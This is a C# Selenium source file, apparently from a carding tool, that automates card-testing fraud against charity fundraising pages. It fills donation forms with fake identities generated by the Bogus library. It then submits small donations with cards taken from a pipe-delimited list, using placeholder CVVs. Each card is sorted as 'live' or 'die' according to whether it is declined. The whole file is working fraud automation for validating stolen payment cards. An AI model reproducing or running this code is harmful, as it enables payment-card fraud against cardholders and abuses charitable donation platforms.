using Bogus;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Threading;

namespace _0lymp.us.Gods
{
    public partial class Persephone : Component
    {
        public delegate void VerifyCardsCompleteHandler();

        public delegate void StateCardsCompleteHandler(string card);

        public delegate void ReduceCardsCompleteHandler(string cards);

        private static IWebDriver persephone;

        public Thread VerifyCardsThread;

        public Thread StateCardsThread;

        public Thread ReduceCardsThread;

        public List<string> CardsList
        {
            get;
            set;
        }

        public string Url
        {
            get;
            set;
        }

        private Faker Faker
        {
            get;
            set;
        }

        private string FirstName
        {
            get;
            set;
        }

        private string LastName
        {
            get;
            set;
        }

        private string UserName
        {
            get;
            set;
        }

        private string Email
        {
            get;
            set;
        }

        private string Company
        {
            get;
            set;
        }

        private string Password
        {
            get;
            set;
        }

        private string Address
        {
            get;
            set;
        }

        private string Address2
        {
            get;
            set;
        }

        private string City
        {
            get;
            set;
        }

        private string State
        {
            get;
            set;
        }

        private string Zip
        {
            get;
            set;
        }

        private string Phone
        {
            get;
            set;
        }

        private bool SecondDonationBilling
        {
            get;
            set;
        }

        public event VerifyCardsCompleteHandler VerifyCardsComplete;

        public event StateCardsCompleteHandler LiveCardComplete;

        public event StateCardsCompleteHandler DieCardComplete;

        public event ReduceCardsCompleteHandler ReduceCardsComplete;

        public Persephone()
        {
            InitializeComponent();
            Faker = new Faker();
        }

        public Persephone(IContainer container)
        {
            container.Add(this);
            InitializeComponent();
        }

        public void VerifyCards()
        {
            FirstName = Faker.Name.FirstName();
            LastName = Faker.Name.LastName();
            UserName = Faker.Internet.UserName();
            Password = Faker.Internet.Password();
            Email = Faker.Internet.Email();
            Company = Faker.Company.CompanyName();
            Address = Faker.Address.StreetAddress();
            Address2 = ((Math.Round(new Random().NextDouble()) == 0.0) ? "" : Faker.Address.SecondaryAddress());
            City = Faker.Address.City();
            State = Faker.Address.StateAbbr();
            Zip = Faker.Address.ZipCode("#####");
            Phone = Faker.Phone.PhoneNumber();
            Load();
            persephone.Kill();
            this.VerifyCardsComplete();
        }

        private void Load(bool fastRestart = false)
        {
            try
            {
                List<string> source = new List<string>
            {
                "/medical-fundraising",
                "/memorial-fundraising",
                "/emergency-fundraising",
                "/charity-fundraising",
                "/education-fundraising"
            };
                if (!fastRestart)
                {
                    persephone = Driver.Chrome();
                }
                persephone.GoUrl(Url + source.OrderBy((string x) => Guid.NewGuid()).FirstOrDefault().ToString());
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            IWebElement webElement = persephone.ElementRandomVisible(By.CssSelector("div.react-campaign-tile > a"), "ExceptionLoad");
            if (webElement.IsNotNull())
            {
                SelectDonationType(webElement);
            }
            else
            {
                FastRestart();
            }
        }

        private void SelectDonationType(IWebElement anchorDonationType)
        {
            try
            {
                anchorDonationType.Click();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            IWebElement webElement = persephone.ElementVisible(By.CssSelector("#root > div > div.t-campaign-page-template-content.global-wrapper > div.p-campaign > div.p-campaign-sidebar > aside > div.o-campaign-sidebar-wrapper > a.mb.a-button.a-button--max-full.a-button--large.a-button--solid-yellow.a-link"), "ExceptionSelectionDonationType");
            if (webElement.IsNotNull())
            {
                DonateNow(webElement);
            }
            else
            {
                FastRestart();
            }
        }

        private void DonateNow(IWebElement anchorDonateNow)
        {
            try
            {
                anchorDonateNow.Click();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (persephone.ElementVisible(By.Id("donate_ccnum"), "ExceptionSelectionDonationTypeDonateCCnum").IsNotNull())
            {
                FastRestart();
            }
            if (persephone.ElementVisible(By.Id("btn_enterdonate_continue"), "ExceptionSelectionDonationType").IsNotNull())
            {
                Donation();
            }
            else
            {
                FastRestart();
            }
        }

        private void Donation()
        {
            try
            {
                persephone.FindElement(By.Id("input_amount")).SendKeys(new Random().Next(5, 10).ToString());
                IWebElement webElement = persephone.ElementVisible(By.Id("gfm_tip_amount"));
                if (webElement.IsNotNull())
                {
                    webElement.Click();
                    (from x in persephone.FindElements(By.CssSelector("#gfm_tip_amount_div > a:not(.gfm-tips-percentage)"))
                     orderby Guid.NewGuid()
                     select x).FirstOrDefault().JsClick();
                }
                IWebElement webElement2 = persephone.ElementVisible(By.Id("input_amount_other_tip"));
                if (webElement2.IsNotNull())
                {
                    webElement2.SendKeys(new Random().Next(1, 5).ToString());
                }
                persephone.FindElement(By.Id("donate_firstname")).SendKeys(FirstName);
                persephone.FindElement(By.Id("donate_lastname")).SendKeys(LastName);
                persephone.FindElement(By.Id("donate_email")).SendKeys(Email);
                IWebElement webElement3 = persephone.ElementVisible(By.Id("dd_country"));
                if (webElement3.IsNotNull())
                {
                    webElement3.Click();
                    (from x in persephone.FindElements(By.CssSelector("#dd_country_div > a"))
                     orderby Guid.NewGuid()
                     select x).FirstOrDefault().JsClick();
                    persephone.FindElement(By.Id("donate_zip_selector")).SendKeys(Zip);
                }
                IWebElement webElement4 = persephone.ElementVisible(By.Id("dd_teamMemberReferral"));
                if (webElement4.IsNotNull() && Math.Round(new Random().NextDouble()) == 1.0)
                {
                    webElement4.Click();
                    (from x in persephone.FindElements(By.CssSelector("#dd_teamMemberReferral_div > a"))
                     orderby Guid.NewGuid()
                     select x).FirstOrDefault().JsClick();
                }
                persephone.FindElement(By.Id("btn_enterdonate_continue")).Click();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (persephone.ElementVisible(By.CssSelector("#donate-add-card > div.form-cc-contain > input")).IsNotNull())
            {
                LastProccess();
            }
            else
            {
                FastRestart();
            }
        }

        private void LastProccess()
        {
            try
            {
                int num = 0;
                while (num < CardsList.Count())
                {
                    List<string> list = CardsList[num].Split('|').ToList();
                    if (CardsList.Count() > 1)
                    {
                        CardsList[num] = CardsList[num].Replace("\r", "");
                    }
                    string text = CardsList[num];
                    string cards = CardsList[num].ToString();
                    if (CardsList.Count() > 1)
                    {
                        string text3 = CardsList[num] = (CardsList[num] += "\r");
                        cards = string.Join("", CardsList.ToArray());
                        text += "\r";
                    }
                    DonationBilling(list[0], list[1], list[2], list[3]);
                    if (Confirmation())
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteLiveCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        if (CardsList.Count() > 0)
                        {
                            Restart();
                        }
                    }
                    else
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteDieCardThread(text);
                        CardsList.Remove(CardsList[num]);
                    }
                }
            }
            catch (ArgumentOutOfRangeException)
            {
            }
        }

        private void DonationBilling(string number, string month, string year, string cvv)
        {
            try
            {
                persephone.FindElement(By.Name("billingCcNumber")).Clear();
                persephone.FindElement(By.Name("billingCcNumber")).SendKeys(number);
                persephone.FindElement(By.Name("billingCcMonth")).Clear();
                persephone.FindElement(By.Name("billingCcMonth")).SendKeys(month);
                persephone.FindElement(By.Name("billingCcYear")).Clear();
                persephone.FindElement(By.Name("billingCcYear")).SendKeys(year.Substring(year.Length - 2));
                persephone.FindElement(By.Name("billingCcCvv")).Clear();
                cvv = cvv.Replace("\r", "");
                switch (cvv.Count())
                {
                    case 3:
                        persephone.FindElement(By.Name("billingCcCvv")).SendKeys("000");
                        break;
                    case 4:
                        persephone.FindElement(By.Name("billingCcCvv")).SendKeys("0000");
                        break;
                }
                new SelectElement(persephone.FindElement(By.Id("dd_billing_country_hiddenvalue"))).SelectByValue("US");
                persephone.FindElement(By.Id("billing-address-zip-or-postcode")).Clear();
                persephone.FindElement(By.Id("billing-address-zip-or-postcode")).SendKeys(Zip);
                persephone.FindElement(By.Id("btn_enterdonate_next")).Click();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (persephone.ElementVisible(By.Id("btn-complete-receipt"), "ExceptionDonationBilling").IsNotNull())
            {
                DonateConfirm();
            }
            else
            {
                FastRestart();
            }
        }

        private void DonateConfirm()
        {
            try
            {
                persephone.FindElement(By.Id("btn-complete-receipt")).Click();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            IWebElement element = persephone.ElementTextContains(By.CssSelector("#donate-billing-form > div.general-error"), "zip", "ExceptionDonateConfirm");
            if (element.IsNotNull())
            {
                ResolveGeneralErrorZip();
            }
        }

        private void ResolveGeneralErrorZip()
        {
            try
            {
                persephone.FindElement(By.Id("billing-address-zip-or-postcode")).Clear();
                persephone.FindElement(By.Id("billing-address-zip-or-postcode")).SendKeys(Faker.Address.ZipCode());
                persephone.FindElement(By.Id("btn_enterdonate_next")).Click();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
            if (persephone.ElementVisible(By.Id("btn-complete-receipt"), "ExceptionResolveGeneralErrorZip").IsNotNull())
            {
                DonateConfirm();
            }
            else
            {
                FastRestart();
            }
        }

        private bool Confirmation()
        {
            IWebElement element = persephone.ElementTextContains(By.CssSelector("#donate-billing-form > div.general-error"), "declined", "Die");
            IWebElement element2 = persephone.ElementTextContains(By.CssSelector("#donate-billing-form > div.general-error"), "Invalid", "Die2");
            if (element.IsNotNull() || element2.IsNotNull())
            {
                return false;
            }
            IWebElement element3 = persephone.ElementTextContains(By.CssSelector("#facebook-share-modal > div.logo-header > h1"), "Sharing", "Live");
            if (element3.IsNotNull())
            {
                return true;
            }
            FastRestart();
            return false;
        }

        private void EditInformation(IWebElement anchorEditInformation)
        {
            try
            {
                anchorEditInformation.Click();
            }
            catch (NoSuchElementException)
            {
            }
            catch (StaleElementReferenceException)
            {
            }
            catch (WebDriverException)
            {
            }
            catch (NullReferenceException)
            {
            }
        }

        private void Restart()
        {
            persephone.Kill();
            VerifyCards();
        }

        private void FastRestart()
        {
            Load(fastRestart: true);
        }

        public void ExecuteThread()
        {
            VerifyCardsThread = new Thread(VerifyCards);
            VerifyCardsThread.Start();
        }

        public void KillThread()
        {
            try
            {
                VerifyCardsThread.Abort();
                VerifyCardsThread.Join();
                persephone.Kill();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteLiveCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                LiveCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillLiveCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteDieCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                DieCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillDieCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteReduceCardsThread(string cards)
        {
            ReduceCardsThread = new Thread((ThreadStart)delegate
            {
                ReduceCards(cards);
            });
            ReduceCardsThread.Start();
        }

        public void KillReduceCardsThread()
        {
            try
            {
                ReduceCardsThread.Abort();
                ReduceCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        public void ReduceCards(string cards)
        {
            this.ReduceCardsComplete(cards);
        }

        private void LiveCard(string card)
        {
            this.LiveCardComplete(card);
        }

        private void DieCard(string card)
        {
            this.DieCardComplete(card);
        }

    }

}